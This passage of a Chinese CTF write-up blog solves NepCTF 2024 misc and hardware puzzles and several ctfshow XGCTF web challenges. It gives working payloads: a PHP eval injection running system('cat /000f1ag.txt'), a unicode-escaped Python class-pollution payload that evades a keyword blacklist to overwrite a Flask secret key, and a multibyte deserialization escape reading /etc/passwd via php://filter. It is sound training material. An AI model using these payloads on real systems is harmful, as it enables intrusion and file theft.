class="line">NepCTF&#123;U_GET_THE_TWO_IT_IS_EASY_NO_RIGHT?&#125;</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="NepMagic-——-CheckIn"><a href="#NepMagic-——-CheckIn" class="headerlink" title="NepMagic —— CheckIn"></a>NepMagic —— CheckIn</h2><p>认真玩游戏即可得到flag</p><p><img src="/NepCTF_2024/image-20240824165934829.png" alt="image-20240824165934829"></p><h2 id="Nemophila"><a href="#Nemophila" class="headerlink" title="Nemophila"></a>Nemophila</h2><p>先看<code>mimi.py</code>，通过分析可以得到<code>key</code></p><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;这里有一个藏宝室，镇守着一个宝箱怪，当你说出正确的口令时，你也就快获得了这个屋子里最至高无上的宝物。&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提示：宝箱怪只会提示你口令正确与否，请你试试吧！&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Turn in your guess: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) !=<span class="number">48</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;长度不对！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag.capitalize()[<span class="number">0</span>]) != <span class="number">83</span> <span class="keyword">or</span> <span class="keyword">not</span> flag[<span class="number">0</span>].islower():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] != <span class="string">&quot;ve&#125;&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.count(<span class="built_in">chr</span>(<span class="number">95</span>)) != <span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode((flag[<span class="number">10</span>:<span class="number">13</span>]+flag[<span class="number">28</span>:<span class="number">31</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode() != <span class="string">&#x27;RnJpSGlt&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(flag[<span class="number">24</span>:<span class="number">26</span>]) &gt; <span class="number">10</span> <span class="keyword">and</span> <span class="built_in">int</span>(flag[<span class="number">24</span>:<span class="number">26</span>]) &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="built_in">pow</span>(<span class="built_in">int</span>(flag[<span class="number">24</span>:<span class="number">26</span>]),<span class="number">2</span>,<span class="number">5</span>) != <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;好像有点不对！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">number = flag[<span class="number">33</span>] + flag[<span class="number">41</span>] + flag[<span class="number">43</span>:<span class="number">45</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(number) * <span class="number">9_27</span> != <span class="number">1028970</span> <span class="keyword">and</span> <span class="keyword">not</span> number.isnumeric():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还是不对呢！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">35</span>:<span class="number">41</span>].replace(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;1&quot;</span>) != <span class="string">&quot;1t1rna&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">31</span>:<span class="number">33</span>].swapcase() != <span class="string">&quot;ME&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这不是我!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>,flag.split(<span class="string">&quot;_&quot;</span>))) != [<span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>] <span class="keyword">and</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>,flag.split(<span class="string">&quot;&amp;&quot;</span>))) != [<span class="number">17</span>, <span class="number">9</span>, <span class="number">20</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;换个顺序！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(<span class="built_in">min</span>(flag[:<span class="number">2</span>].swapcase())) != <span class="number">69</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">2</span>] + flag[<span class="number">4</span>:<span class="number">6</span>] != <span class="string">&quot;cet4&quot;</span>[:<span class="number">3</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我不想考四级！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">new=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:<span class="number">10</span>] + flag[<span class="number">18</span>] + flag[<span class="number">26</span>]: new += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> new != <span class="string">&quot;jt|Df&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please try again!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;SunR&quot;</span> <span class="keyword">in</span> flag <span class="keyword">and</span> <span class="string">&quot;eren&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;好像对了！可以先去试试！&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;恭喜你~发现了上个世纪的秘密~快去向冒险家协会索要报酬吧！&quot;</span>)</span><br></pre></td></tr></table></figure><p>最终得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;</span><br></pre></td></tr></table></figure><p>把这个拿去解压压缩包，得到新的文件，根据文件后缀，猜测原本应该是<code>png</code>图片，拿正常文件的文件头和它做异或，发现<code>key</code>还是上面那串</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">open</span>(<span class="string">&#x27;miaomiao.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">key = <span class="string">b&#x27;secret_is&#123;Frieren&amp;C_SunR15e&amp;Himme1_eterna1_10ve&#125;&#x27;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    data = enc[i]^key[i%<span class="built_in">len</span>(key)]</span><br><span class="line">    flag.append(data)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(flag)</span><br></pre></td></tr></table></figure><p>再将得到的文件修改高度，在文件底部得到flag。</p><p><img src="/NepCTF_2024/image-20240824221252171.png" alt="image-20240824221252171"></p><h2 id="3DNep"><a href="#3DNep" class="headerlink" title="3DNep"></a>3DNep</h2><p>用 <a href="https://gltf-viewer.donmccurdy.com/">在线网站</a> 查看模型，可以在模型底部看到一个汉信码</p><p><img src="/NepCTF_2024/image-20240824222600683.png" alt="image-20240824222600683"></p><p>接着找一个 <a href="https://tuzim.net/hxdecode/">在线网站</a> 扫码，即可得到flag</p><p><img src="/NepCTF_2024/image-20240824222651259.png" alt="image-20240824222651259"></p><h2 id="NepCamera"><a href="#NepCamera" class="headerlink" title="NepCamera"></a>NepCamera</h2><p>先将usb的数据提取出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r NepCamera.pcapng -T fields -e usb.iso.data &gt; test</span><br></pre></td></tr></table></figure><p>接着通过观察，发现里面的数据有大量的<code>ffd8ffe0</code></p><p>接着以<code>\n</code>和<code>,</code>为分割符，将所有数据分离，并将每条数据的前 24 个字符丢弃，合成一整条字符串。</p><p>最后以 <code>ffd8ffe0</code> 为界限，把所有图片提取出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">datas = <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hex_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">    data = i.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    hex_data += <span class="string">&#x27;&#x27;</span>.join([d[<span class="number">24</span>:] <span class="keyword">for</span> d <span class="keyword">in</span> data])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(hex_data))</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = hex_data.find(<span class="string">&#x27;ffd8ffe0&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> start == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    end = hex_data[start+<span class="number">8</span>:].find(<span class="string">&#x27;ffd8ffe0&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> end == -<span class="number">1</span>:</span><br><span class="line">        end = <span class="built_in">len</span>(hex_data)</span><br><span class="line">    out_data = hex_data[start:end]</span><br><span class="line">    hex_data = hex_data[end:]</span><br><span class="line">    out_data = <span class="built_in">bytes</span>.fromhex(out_data)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;./img/&#x27;</span>+<span class="built_in">str</span>(cnt)+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(out_data)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br></pre></td></tr></table></figure><p>通过查看图片，可以把flag抄下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Th3_c4mer4_takes_c1ear_pictures&#125;</span><br></pre></td></tr></table></figure><h1 id="HardWare"><a href="#HardWare" class="headerlink" title="HardWare"></a>HardWare</h1><h2 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h2><p>先用 <code>binwalk</code> 分离</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk NepCTF_m9gv1.bin -e</span><br></pre></td></tr></table></figure><p>接着把<code>*.7z*</code> 文件删掉，用<code>strings</code> 简单分析，看那个可能是需要逆向的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings 1*</span><br><span class="line">strings 19*</span><br></pre></td></tr></table></figure><p>通过排除法可以知道分离出来的<code>19047F</code>可能是要分析的程序</p><p>接着把文件底部的一堆字符串复制出来处理</p><p>根据提示，有特殊的函数名，先猜测可能是<code>base64</code> ，搜索一下，发现真有个<code>base64</code></p><p><img src="/NepCTF_2024/image-20240825145342765.png" alt="image-20240825145342765"></p><p>接着根据<code>base64</code>的特征去找，赌他一手结尾有<code>=</code>，发现还真有</p><p><img src="/NepCTF_2024/image-20240825145448679.png" alt="image-20240825145448679"></p><p>但这个字符串并不是<code>base64</code>，只有大写字母+数字，复制下来用<code>CyberChef</code> 一把梭了</p><p><img src="/NepCTF_2024/image-20240825145618000.png" alt="image-20240825145618000"></p><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;Y0u_G0t_K33n_1nS1ght_1n_vXw0rKs!!!_L3t&#x27;s_G0_Furth3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> 新生赛 </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_XGCTF_西瓜杯</title>
      <link href="/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
      <url>/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Author: h1xa</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump((Object)<span class="subst">$_POST</span>[1]);&quot;</span>);</span><br></pre></td></tr></table></figure><p>闭合前面，把命令拼接进去即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=1);system(&quot;cat /000f1ag.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/./ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/w_1_1.png"></p><h2 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, session, redirect, url_for,request,render_template</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line">def <span class="title function_ invoke__">generate_random_md5</span>():</span><br><span class="line">    random_string = os.<span class="title function_ invoke__">urandom</span>(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.<span class="title function_ invoke__">md5</span>(random_string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> md5_hash.<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">def <span class="title function_ invoke__">filter</span>(user_input):</span><br><span class="line">    blacklisted_patterns = [<span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern in blacklisted_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="title function_ invoke__">search</span>(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">return</span> False</span><br><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>():</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="title function_ invoke__">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">app.secret_key = <span class="title function_ invoke__">generate_random_md5</span>()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span>():</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">pass</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/&#x27;,<span class="title">methods</span>=[&#x27;<span class="title">POST</span>&#x27;])</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">index</span>():</span></span><br><span class="line"><span class="class">    <span class="title">username</span> = <span class="title">request</span>.<span class="title">form</span>.<span class="title">get</span>(&#x27;<span class="title">username</span>&#x27;)</span></span><br><span class="line"><span class="class">    <span class="title">password</span> = <span class="title">request</span>.<span class="title">form</span>.<span class="title">get</span>(&#x27;<span class="title">password</span>&#x27;)</span></span><br><span class="line"><span class="class">    <span class="title">session</span>[&quot;<span class="title">username</span>&quot;] = <span class="title">username</span></span></span><br><span class="line"><span class="class">    <span class="title">session</span>[&quot;<span class="title">password</span>&quot;] = <span class="title">password</span></span></span><br><span class="line"><span class="class">    <span class="title">Evil</span> = <span class="title">evil</span>()</span></span><br><span class="line"><span class="class">    <span class="title">if</span> <span class="title">request</span>.<span class="title">data</span>:</span></span><br><span class="line"><span class="class">        <span class="title">if</span> <span class="title">filter</span>(<span class="title">str</span>(<span class="title">request</span>.<span class="title">data</span>)):</span></span><br><span class="line"><span class="class">            <span class="title">return</span> &quot;<span class="title">NO</span> <span class="title">POLLUTED</span>!!!<span class="title">YOU</span> <span class="title">NEED</span> <span class="title">TO</span> <span class="title">GO</span> <span class="title">HOME</span> <span class="title">TO</span> <span class="title">SLEEP</span>~&quot;</span></span><br><span class="line"><span class="class">        <span class="title">else</span>:</span></span><br><span class="line"><span class="class">            <span class="title">merge</span>(<span class="title">json</span>.<span class="title">loads</span>(<span class="title">request</span>.<span class="title">data</span>), <span class="title">Evil</span>)</span></span><br><span class="line"><span class="class">            <span class="title">return</span> &quot;<span class="title">MYBE</span> <span class="title">YOU</span> <span class="title">SHOULD</span> <span class="title">GO</span> /<span class="title">ADMIN</span> <span class="title">TO</span> <span class="title">SEE</span> <span class="title">WHAT</span> <span class="title">HAPPENED</span>&quot;</span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">render_template</span>(&quot;<span class="title">index</span>.<span class="title">html</span>&quot;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/<span class="title">admin</span>&#x27;,<span class="title">methods</span>=[&#x27;<span class="title">POST</span>&#x27;, &#x27;<span class="title">GET</span>&#x27;])</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">templates</span>():</span></span><br><span class="line"><span class="class">    <span class="title">username</span> = <span class="title">session</span>.<span class="title">get</span>(&quot;<span class="title">username</span>&quot;, <span class="title">None</span>)</span></span><br><span class="line"><span class="class">    <span class="title">password</span> = <span class="title">session</span>.<span class="title">get</span>(&quot;<span class="title">password</span>&quot;, <span class="title">None</span>)</span></span><br><span class="line"><span class="class">    <span class="title">if</span> <span class="title">username</span> <span class="title">and</span> <span class="title">password</span>:</span></span><br><span class="line"><span class="class">        <span class="title">if</span> <span class="title">username</span> == &quot;<span class="title">adminer</span>&quot; <span class="title">and</span> <span class="title">password</span> == <span class="title">app</span>.<span class="title">secret_key</span>:</span></span><br><span class="line"><span class="class">            <span class="title">return</span> <span class="title">render_template</span>(&quot;<span class="title">flag</span>.<span class="title">html</span>&quot;, <span class="title">flag</span>=<span class="title">open</span>(&quot;/<span class="title">flag</span>&quot;, &quot;<span class="title">rt</span>&quot;).<span class="title">read</span>())</span></span><br><span class="line"><span class="class">        <span class="title">else</span>:</span></span><br><span class="line"><span class="class">            <span class="title">return</span> &quot;<span class="title">Unauthorized</span>&quot;</span></span><br><span class="line"><span class="class">    <span class="title">else</span>:</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">f</span>&#x27;<span class="title">Hello</span>,  <span class="title">This</span> <span class="title">is</span> <span class="title">the</span> <span class="title">POLLUTED</span> <span class="title">page</span>.&#x27;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> <span class="title">__name__</span> == &#x27;<span class="title">__main__</span>&#x27;:</span></span><br><span class="line"><span class="class">    <span class="title">app</span>.<span class="title">run</span>(<span class="title">host</span>=&#x27;0.0.0.0&#x27;, <span class="title">port</span>=5000)</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>python的原型链污染，需要把<code>app.secret_key</code>污染成一个我们想要的值，接着把 <code>_static_folder</code>的路径污染成服务器的根目录，实现任意文件读取从而得到flag。</p><p>过滤的绕过可以用 unicode 编码来绕，因为源码在检测waf后用了 <code>json.loads</code> 解析字符串，能识别 unicode。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;adminer&quot;,&quot;password&quot;:&quot;123&quot;,&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot; : &#123;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot; :&#123;&quot;\u0061\u0070\u0070&quot; :&#123;&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;: &quot;123&quot;,&quot;\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072&quot;:&quot;\u002f&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>之后访问 <code>/static/flag</code>即可得到flag。</p><h2 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先是字符串逃逸反序列化</p><p>参考链接：<a href="https://blog.csdn.net/Sa1nZen/article/details/139046383">Web-逃跑大师–第二届黄河流域公安院校网络空间安全技能邀请赛</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当以 \xF0 开头的字节序列出现在 UTF-8 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-8 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">不符合4位的规则的话，mb_substr和mb_strpos执行存在差异：</span><br><span class="line">(1)mb_strpos遇到\xF0时，会把无效字节先前的字节视为一个字符，然后从无效字节重新开始解析</span><br><span class="line">mb_strpos(&quot;\xf0\x9fAAA&lt;BB&quot;, &#x27;&lt;&#x27;); #返回4 \xf0\x9f视作是一个字节，从A开始变为无效字节 #A为\x41  上述字符串其认为是7个字节</span><br><span class="line"></span><br><span class="line">(2)mb_substr遇到\xF0时，会把无效字节当做四字节Unicode字符的一部分，然后继续解析</span><br><span class="line">mb_substr(&quot;\xf0\x9fAAA&lt;BB&quot;, 0, 4); #&quot;\xf0\x9fAAA&lt;B&quot; \xf0\x9fAA视作一个字符 上述字符串其认为是5个字节</span><br><span class="line"></span><br><span class="line">结论：mb_strpos相对于mb_substr来说，可以把索引值向后移动</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此我们可以知道</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节</span><br><span class="line">每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节</span><br><span class="line">每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以第一步是先在 <code>start</code> 里传入我们想要序列化的字符串，然后通过截取把前面的那些干扰字符去掉，从而能够控制 <code>filename</code>的值任意读文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img 